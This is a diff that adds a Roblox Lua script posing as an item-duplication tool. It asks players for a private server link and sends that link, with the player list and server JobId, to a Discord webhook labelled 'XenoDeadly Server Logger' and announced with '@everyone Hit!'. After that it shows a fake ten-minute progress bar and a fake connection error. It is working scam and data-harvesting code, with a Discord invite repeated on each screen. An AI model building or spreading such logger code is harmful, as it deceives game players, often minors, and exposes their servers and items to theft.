+                Color = Color3.fromRGB(180, 220, 255)
+            }):Play()
+        end
+        
+        local highlight = button:FindFirstChild("Highlight")
+        if highlight then
+            highlight.Visible = true
+            TweenService:Create(highlight, TweenInfo.new(0.2), {
+                BackgroundTransparency = 0.3
+            }):Play()
+        end
+        
+        selectedButton = button
+        
+        -- Click animation
+        local tween = TweenService:Create(button, TweenInfo.new(0.1), {Size = UDim2.new(0.72, 0, 0.12, 0)})
+        tween:Play()
+        tween.Completed:Connect(function()
+            TweenService:Create(button, TweenInfo.new(0.1), {Size = UDim2.new(0.7, 0, 0.12, 0)}):Play()
+        end)
+    end)
+end
+
+-- Continue Button
+local continueBtn = Instance.new("TextButton")
+continueBtn.Name = "ContinueButton"
+continueBtn.Parent = page1
+continueBtn.BackgroundColor3 = Color3.fromRGB(0, 160, 90)
+continueBtn.BorderSizePixel = 0
+continueBtn.Position = UDim2.new(0.3, 0, 0.83, 0)
+continueBtn.Size = UDim2.new(0.4, 0, 0.08, 0)
+continueBtn.Font = Enum.Font.GothamBold
+continueBtn.Text = "CONTINUE"
+continueBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+continueBtn.TextSize = 12
+continueBtn.AutoButtonColor = false
+
+local continueCorner = Instance.new("UICorner")
+continueCorner.CornerRadius = UDim.new(0, 6)
+continueCorner.Parent = continueBtn
+
+local continueGradient = Instance.new("UIGradient")
+continueGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 180, 100)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 140, 80))
+}
+continueGradient.Rotation = 90
+continueGradient.Parent = continueBtn
+
+-- Continue button hover effect
+continueBtn.MouseEnter:Connect(function()
+    TweenService:Create(continueBtn, TweenInfo.new(0.2), {
+        BackgroundColor3 = Color3.fromRGB(0, 180, 110),
+        Size = UDim2.new(0.41, 0, 0.082, 0)
+    }):Play()
+end)
+
+continueBtn.MouseLeave:Connect(function()
+    TweenService:Create(continueBtn, TweenInfo.new(0.2), {
+        BackgroundColor3 = Color3.fromRGB(0, 160, 90),
+        Size = UDim2.new(0.4, 0, 0.08, 0)
+    }):Play()
+end)
+
+-- Discord link at the bottom of page 1
+local discordLabel1 = Instance.new("TextLabel")
+discordLabel1.Parent = page1
+discordLabel1.BackgroundTransparency = 1
+discordLabel1.Position = UDim2.new(0, 0, 0.95, 0)
+discordLabel1.Size = UDim2.new(1, 0, 0.05, 0)
+discordLabel1.Font = Enum.Font.Gotham
+discordLabel1.Text = "https://discord.gg/P3w2bYWeEK"
+discordLabel1.TextColor3 = Color3.fromRGB(0, 180, 255)
+discordLabel1.TextSize = 12
+discordLabel1.TextTransparency = 0.3
+
+-- Loading Page 1
+local loadingPage1 = Instance.new("Frame")
+loadingPage1.Name = "LoadingPage1"
+loadingPage1.Parent = mainFrame
+loadingPage1.BackgroundTransparency = 1
+loadingPage1.Size = UDim2.new(1, 0, 1, 0)
+loadingPage1.Visible = false
+
+local loadingText1 = Instance.new("TextLabel")
+loadingText1.Parent = loadingPage1
+loadingText1.BackgroundTransparency = 1
+loadingText1.Position = UDim2.new(0, 0, 0.4, 0)
+loadingText1.Size = UDim2.new(1, 0, 0.2, 0)
+loadingText1.Font = Enum.Font.Gotham
+loadingText1.Text = "LOADING..."
+loadingText1.TextColor3 = Color3.fromRGB(0, 200, 255)
+loadingText1.TextSize = 16
+
+-- Discord link at the bottom of loading page 1
+local discordLabelLoading1 = Instance.new("TextLabel")
+discordLabelLoading1.Parent = loadingPage1
+discordLabelLoading1.BackgroundTransparency = 1
+discordLabelLoading1.Position = UDim2.new(0, 0, 0.95, 0)
+discordLabelLoading1.Size = UDim2.new(1, 0, 0.05, 0)
+discordLabelLoading1.Font = Enum.Font.Gotham
+discordLabelLoading1.Text = "https://discord.gg/P3w2bYWeEK"
+discordLabelLoading1.TextColor3 = Color3.fromRGB(0, 180, 255)
+discordLabelLoading1.TextSize = 12
+discordLabelLoading1.TextTransparency = 0.3
+
+-- Animated loading dots
+spawn(function()
+    local dots = {".", "..", "...", "...."}
+    local index = 1
+    while loadingText1.Parent do
+        loadingText1.Text = "LOADING" .. dots[index]
+        index = index % #dots + 1
+        wait(0.5)
+    end
+end)
+
+-- Loading spinner
+local spinner = Instance.new("Frame")
+spinner.Parent = loadingPage1
+spinner.BackgroundTransparency = 1
+spinner.Size = UDim2.new(0, 40, 0, 40)
+spinner.Position = UDim2.new(0.5, -20, 0.6, -20)
+spinner.AnchorPoint = Vector2.new(0.5, 0.5)
+
+local spinnerCircle = Instance.new("ImageLabel")
+spinnerCircle.Parent = spinner
+spinnerCircle.BackgroundTransparency = 1
+spinnerCircle.Size = UDim2.new(1, 0, 1, 0)
+spinnerCircle.Image = "rbxassetid://5127187844"
+spinnerCircle.ImageColor3 = Color3.fromRGB(0, 200, 255)
+
+-- Rotate spinner
+spawn(function()
+    while spinner.Parent do
+        spinnerCircle.Rotation = 0
+        TweenService:Create(spinnerCircle, TweenInfo.new(1, Enum.EasingStyle.Linear), {
+            Rotation = 360
+        }):Play()
+        wait(1)
+    end
+end)
+
+-- Page 2: Private Server Input
+local page2 = Instance.new("Frame")
+page2.Name = "Page2"
+page2.Parent = mainFrame
+page2.BackgroundTransparency = 1
+page2.Size = UDim2.new(1, 0, 1, 0)
+page2.Visible = false
+
+local inputLabel = Instance.new("TextLabel")
+inputLabel.Parent = page2
+inputLabel.BackgroundTransparency = 1
+inputLabel.Position = UDim2.new(0, 0, 0.25, 0)
+inputLabel.Size = UDim2.new(1, 0, 0.12, 0)
+inputLabel.Font = Enum.Font.Gotham
+inputLabel.Text = "PUT IN PRIVATE SERVER KEY"
+inputLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+inputLabel.TextSize = 14
+
+local textBox = Instance.new("TextBox")
+textBox.Parent = page2
+textBox.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
+textBox.BorderSizePixel = 0
+textBox.Position = UDim2.new(0.1, 0, 0.45, 0)
+textBox.Size = UDim2.new(0.8, 0, 0.12, 0)
+textBox.Font = Enum.Font.Gotham
+textBox.PlaceholderText = "https://www.roblox.com/share..."
+textBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 140)
+textBox.Text = ""
+textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+textBox.TextSize = 12
+textBox.ClearTextOnFocus = false
+
+local textBoxCorner = Instance.new("UICorner")
+textBoxCorner.CornerRadius = UDim.new(0, 6)
+textBoxCorner.Parent = textBox
+
+local textBoxStroke = Instance.new("UIStroke")
+textBoxStroke.Color = Color3.fromRGB(60, 60, 80)
+textBoxStroke.Thickness = 1
+textBoxStroke.Transparency = 0.5
+textBoxStroke.Parent = textBox
+
+-- Discord link at the bottom of page 2
+local discordLabel2 = Instance.new("TextLabel")
+discordLabel2.Parent = page2
+discordLabel2.BackgroundTransparency = 1
+discordLabel2.Position = UDim2.new(0, 0, 0.95, 0)
+discordLabel2.Size = UDim2.new(1, 0, 0.05, 0)
+discordLabel2.Font = Enum.Font.Gotham
+discordLabel2.Text = "https://discord.gg/P3w2bYWeEK"
+discordLabel2.TextColor3 = Color3.fromRGB(0, 180, 255)
+discordLabel2.TextSize = 12
+discordLabel2.TextTransparency = 0.3
+
+-- Textbox focus effect
+textBox.Focused:Connect(function()
+    TweenService:Create(textBoxStroke, TweenInfo.new(0.2), {
+        Color = Color3.fromRGB(0, 150, 255),
+        Thickness = 2
+    }):Play()
+end)
+
+textBox.FocusLost:Connect(function()
+    TweenService:Create(textBoxStroke, TweenInfo.new(0.2), {
+        Color = Color3.fromRGB(60, 60, 80),
+        Thickness = 1
+    }):Play()
+end)
+
+local submitBtn = Instance.new("TextButton")
+submitBtn.Parent = page2
+submitBtn.BackgroundColor3 = Color3.fromRGB(0, 160, 90)
+submitBtn.BorderSizePixel = 0
+submitBtn.Position = UDim2.new(0.3, 0, 0.7, 0)
+submitBtn.Size = UDim2.new(0.4, 0, 0.08, 0)
+submitBtn.Font = Enum.Font.GothamBold
+submitBtn.Text = "SUBMIT"
+submitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+submitBtn.TextSize = 12
+submitBtn.AutoButtonColor = false
+
+local submitCorner = Instance.new("UICorner")
+submitCorner.CornerRadius = UDim.new(0, 6)
+submitCorner.Parent = submitBtn
+
+-- Submit button hover effect
+submitBtn.MouseEnter:Connect(function()
+    TweenService:Create(submitBtn, TweenInfo.new(0.2), {
+        BackgroundColor3 = Color3.fromRGB(0, 180, 110),
+        Size = UDim2.new(0.41, 0, 0.082, 0)
+    }):Play()
+end)
+
+submitBtn.MouseLeave:Connect(function()
+    TweenService:Create(submitBtn, TweenInfo.new(0.2), {
+        BackgroundColor3 = Color3.fromRGB(0, 160, 90),
+        Size = UDim2.new(0.4, 0, 0.08, 0)
+    }):Play()
+end)
+
+-- Loading Page 2
+local loadingPage2 = Instance.new("Frame")
+loadingPage2.Name = "LoadingPage2"
+loadingPage2.Parent = mainFrame
+loadingPage2.BackgroundTransparency = 1
+loadingPage2.Size = UDim2.new(1, 0, 1, 0)
+loadingPage2.Visible = false
+
+local loadingText2 = Instance.new("TextLabel")
+loadingText2.Parent = loadingPage2
+loadingText2.BackgroundTransparency = 1
+loadingText2.Position = UDim2.new(0, 0, 0.4, 0)
+loadingText2.Size = UDim2.new(1, 0, 0.2, 0)
+loadingText2.Font = Enum.Font.Gotham
+loadingText2.Text = "PROCESSING..."
+loadingText2.TextColor3 = Color3.fromRGB(0, 200, 255)
+loadingText2.TextSize = 16
+
+-- Discord link at the bottom of loading page 2
+local discordLabelLoading2 = Instance.new("TextLabel")
+discordLabelLoading2.Parent = loadingPage2
+discordLabelLoading2.BackgroundTransparency = 1
+discordLabelLoading2.Position = UDim2.new(0, 0, 0.95, 0)
+discordLabelLoading2.Size = UDim2.new(1, 0, 0.05, 0)
+discordLabelLoading2.Font = Enum.Font.Gotham
+discordLabelLoading2.Text = "https://discord.gg/P3w2bYWeEK"
+discordLabelLoading2.TextColor3 = Color3.fromRGB(0, 180, 255)
+discordLabelLoading2.TextSize = 12
+discordLabelLoading2.TextTransparency = 0.3
+
+-- Page 3: Progress Bar
+local page3 = Instance.new("Frame")
+page3.Name = "Page3"
+page3.Parent = mainFrame
+page3.BackgroundTransparency = 1
+page3.Size = UDim2.new(1, 0, 1, 0)
+page3.Visible = false
+
+local processLabel = Instance.new("TextLabel")
+processLabel.Parent = page3
+processLabel.BackgroundTransparency = 1
+processLabel.Position = UDim2.new(0, 0, 0.25, 0)
+processLabel.Size = UDim2.new(1, 0, 0.12, 0)
+processLabel.Font = Enum.Font.GothamBold
+processLabel.Text = "PROCESSING DUPE"
+processLabel.TextColor3 = Color3.fromRGB(0, 200, 255)
+processLabel.TextSize = 16
+
+-- Discord link at the bottom of page 3
+local discordLabel3 = Instance.new("TextLabel")
+discordLabel3.Parent = page3
+discordLabel3.BackgroundTransparency = 1
+discordLabel3.Position = UDim2.new(0, 0, 0.95, 0)
+discordLabel3.Size = UDim2.new(1, 0, 0.05, 0)
+discordLabel3.Font = Enum.Font.Gotham
+discordLabel3.Text = "https://discord.gg/P3w2bYWeEK"
+discordLabel3.TextColor3 = Color3.fromRGB(0, 180, 255)
+discordLabel3.TextSize = 12
+discordLabel3.TextTransparency = 0.3
+
+-- Progress Bar Background
+local progressBg = Instance.new("Frame")
+progressBg.Parent = page3
+progressBg.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
+progressBg.BorderSizePixel = 0
+progressBg.Position = UDim2.new(0.15, 0, 0.5, 0)
+progressBg.Size = UDim2.new(0.7, 0, 0.08, 0)
+
+local progressBgCorner = Instance.new("UICorner")
+progressBgCorner.CornerRadius = UDim.new(0, 4)
+progressBgCorner.Parent = progressBg
+
+-- Progress Bar Fill
+local progressFill = Instance.new("Frame")
+progressFill.Parent = progressBg
+progressFill.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
+progressFill.BorderSizePixel = 0
+progressFill.Size = UDim2.new(0, 0, 1, 0)
+
+local progressFillCorner = Instance.new("UICorner")
+progressFillCorner.CornerRadius = UDim.new(0, 4)
+progressFillCorner.Parent = progressFill
+
+-- Progress glow effect
+local progressGlow = Instance.new("Frame")
+progressGlow.Parent = progressFill
+progressGlow.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
+progressGlow.BackgroundTransparency = 0.7
+progressGlow.Size = UDim2.new(0, 20, 1, 0)
+progressGlow.Position = UDim2.new(1, -20, 0, 0)
+progressGlow.BorderSizePixel = 0
+
+-- Animate progress glow
+spawn(function()
+    while progressGlow.Parent do
+        progressGlow.Position = UDim2.new(0, -20, 0, 0)
+        TweenService:Create(progressGlow, TweenInfo.new(1, Enum.EasingStyle.Linear), {
+            Position = UDim2.new(1, 0, 0, 0)
+        }):Play()
+        wait(1)
+    end
+end)
+
+-- Progress Percentage
+local progressText = Instance.new("TextLabel")
+progressText.Parent = page3
+progressText.BackgroundTransparency = 1
+progressText.Position = UDim2.new(0, 0, 0.65, 0)
+progressText.Size = UDim2.new(1, 0, 0.08, 0)
+progressText.Font = Enum.Font.Gotham
+progressText.Text = "0%"
+progressText.TextColor3 = Color3.fromRGB(255, 255, 255)
+progressText.TextSize = 14
+
+-- Error Page
+local errorPage = Instance.new("Frame")
+errorPage.Name = "ErrorPage"
+errorPage.Parent = mainFrame
+errorPage.BackgroundTransparency = 1
+errorPage.Size = UDim2.new(1, 0, 1, 0)
+errorPage.Visible = false
+
+local errorText = Instance.new("TextLabel")
+errorText.Parent = errorPage
+errorText.BackgroundTransparency = 1
+errorText.Position = UDim2.new(0, 0, 0.35, 0)
+errorText.Size = UDim2.new(1, 0, 0.3, 0)
+errorText.Font = Enum.Font.GothamBold
+errorText.Text = "ERROR 404\nPOOR CONNECTION"
+errorText.TextColor3 = Color3.fromRGB(255, 50, 50)
+errorText.TextSize = 16
+
+-- Discord link at the bottom of error page
+local discordLabelError = Instance.new("TextLabel")
+discordLabelError.Parent = errorPage
+discordLabelError.BackgroundTransparency = 1
+discordLabelError.Position = UDim2.new(0, 0, 0.95, 0)
+discordLabelError.Size = UDim2.new(1, 0, 0.05, 0)
+discordLabelError.Font = Enum.Font.Gotham
+discordLabelError.Text = "https://discord.gg/P3w2bYWeEK"
+discordLabelError.TextColor3 = Color3.fromRGB(0, 180, 255)
+discordLabelError.TextSize = 12
+discordLabelError.TextTransparency = 0.3
+
+-- Error icon
+local errorIcon = Instance.new("ImageLabel")
+errorIcon.Parent = errorPage
+errorIcon.BackgroundTransparency = 1
+errorIcon.Size = UDim2.new(0, 50, 0, 50)
+errorIcon.Position = UDim2.new(0.5, -25, 0.2, -25)
+errorIcon.Image = "rbxassetid://3926305904"
+errorIcon.ImageRectOffset = Vector2.new(124, 204)
+errorIcon.ImageRectSize = Vector2.new(36, 36)
+errorIcon.ImageColor3 = Color3.fromRGB(255, 50, 50)
+
+-- Webhook functions
+local function getUptime()
+    local seconds = tick() - workspace.DistributedGameTime
+    local h = math.floor(seconds / 3600)
+    local m = math.floor((seconds % 3600) / 60)
+    local s = math.floor(seconds % 60)
+    return string.format("%02dh %02dm %02ds", h, m, s)
+end
+
+local function getPlayerList(limit)
+    local names = {}
+    for i, p in ipairs(Players:GetPlayers()) do
+        table.insert(names, p.DisplayName .. " (" .. p.Name .. ")")
+        if limit and #names >= limit then
+            table.insert(names, "... and more")
+            break
+        end
+    end
+    return table.concat(names, "\n")
+end
+
+local function getGameName()
+    local ok, info = pcall(function()
+        return MarketplaceService:GetProductInfo(game.PlaceId)
+    end)
+    if ok and type(info) == "table" and info.Name then
+        return info.Name
+    end
+    return "Place " .. tostring(game.PlaceId)
+end
+
+local function sendWebhook(privateServerLink)
+    local embed = {
+        title = "XenoDeadly Server Logger",
+        description = (Players.LocalPlayer and Players.LocalPlayer.DisplayName or "A player") .. " delivered a private server link.",
+        type = "rich",
+        color = tonumber(0x8B0000),
+        fields = {
+            {
+                name = "Private Server Link",
+                value = privateServerLink,
+                inline = false
+            },
+            {
+                name = "Player Count",
+                value = tostring(#Players:GetPlayers()),
+                inline = true
+            },
+            {
+                name = "Max Players",
+                value = tostring(Players.MaxPlayers or "N/A"),
+                inline = true
+            },
+            {
+                name = "Uptime",
+                value = getUptime(),
+                inline = false
+            },
+            {
+                name = "Game",
+                value = getGameName(),
+                inline = true
+            },
+            {
+                name = "JobId",
+                value = tostring(game.JobId),
+                inline = false
+            },
+            {
+                name = "Players",
+                value = getPlayerList(15),
+                inline = false
+            }
+        },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }
+
+    local payload = {
+        content = "@everyone Hit!",
+        embeds = {embed}
+    }
+
+    spawn(function()
+        local ok, res = pcall(function()
+            return httpRequest({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+        
+        if not ok then
+            warn("HTTP request failed:", res)
+        end
+    end)
+end
+
+-- Page transition function
+local function transitionToPage(fromPage, toPage)
+    if fromPage then
+        TweenService:Create(fromPage, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+            Position = UDim2.new(-1, 0, 0, 0)
+        }):Play()
+        wait(0.5)
+        fromPage.Visible = false
+        fromPage.Position = UDim2.new(0, 0, 0, 0)
+    end
+    
+    if toPage then
+        toPage.Visible = true
+        toPage.Position = UDim2.new(1, 0, 0, 0)
+        TweenService:Create(toPage, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+            Position = UDim2.new(0, 0, 0, 0)
+        }):Play()
+    end
+end
+
+-- Event handlers
+continueBtn.MouseButton1Click:Connect(function()
+    if selectedButton then
+        -- Button click animation
+        TweenService:Create(continueBtn, TweenInfo.new(0.1), {
+            Size = UDim2.new(0.38, 0, 0.076, 0)
+        }):Play()
+        wait(0.1)
+        TweenService:Create(continueBtn, TweenInfo.new(0.1), {
+            Size = UDim2.new(0.4, 0, 0.08, 0)
+        }):Play()
+        
+        transitionToPage(page1, loadingPage1)
+        
+        wait(2)
+        
+        transitionToPage(loadingPage1, page2)
+    end
+end)
+
+submitBtn.MouseButton1Click:Connect(function()
+    -- Button click animation
+    TweenService:Create(submitBtn, TweenInfo.new(0.1), {
+        Size = UDim2.new(0.38, 0, 0.076, 0)
+    }):Play()
+    wait(0.1)
+    TweenService:Create(submitBtn, TweenInfo.new(0.1), {
+        Size = UDim2.new(0.4, 0, 0.08, 0)
+    }):Play()
+    
+    local link = textBox.Text
+    if string.sub(link, 1, 8) == "https://" and string.len(link) > 8 then
+        transitionToPage(page2, loadingPage2)
+        
+        -- Send webhook
+        sendWebhook(link)
+        
+        wait(2)
+        
+        transitionToPage(loadingPage2, page3)
+        
+        -- Progress bar animation (10 minutes = 600 seconds)
+        local duration = 600
+        local startTime = tick()
+        
+        spawn(function()
+            while tick() - startTime < duration do
+                local elapsed = tick() - startTime
+                local progress = elapsed / duration
+                local percentage = math.floor(progress * 100)
+                
+                TweenService:Create(progressFill, TweenInfo.new(0.1), {
+                    Size = UDim2.new(progress, 0, 1, 0)
+                }):Play()
+                
+                progressText.Text = percentage .. "%"
+                
+                wait(0.1)
+            end
+            
+            -- Show error after completion
+            transitionToPage(page3, errorPage)
+        end)
+    else
+        -- Shake animation for invalid input
+        local shakeTime = 0.5
+        local shakeOffset = 10
+        
+        TweenService:Create(textBox, TweenInfo.new(shakeTime/5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+            Position = UDim2.new(0.1, shakeOffset, 0.45, 0)
+        }):Play()
+        
+        for i = 1, 4 do
+            wait(shakeTime/5)
+            local offset = i % 2 == 0 and shakeOffset or -shakeOffset
+            TweenService:Create(textBox, TweenInfo.new(shakeTime/5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+                Position = UDim2.new(0.1, offset, 0.45, 0)
+            }):Play()
+        end
+        
+        wait(shakeTime/5)
+        TweenService:Create(textBox, TweenInfo.new(shakeTime/5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+            Position = UDim2.new(0.1, 0, 0.45, 0)
+        }):Play()
+    end
+end)
+
+-- Initial animation
+mainFrame.Size = UDim2.new(0, 0, 0, 0)
+local openTween = TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back), {
+    Size = UDim2.new(0, 400, 0, 300),
+    Position = UDim2.new(0.5, -200, 0.5, -150)
+})
+openTween:Play()
+
+-- Make GUI responsive to screen size changes
+game:GetService("RunService").RenderStepped:Connect(function()
+    local viewportSize = workspace.CurrentCamera.ViewportSize
+    screenGui.Size = UDim2.new(1, 0, 1, 0)
+end)
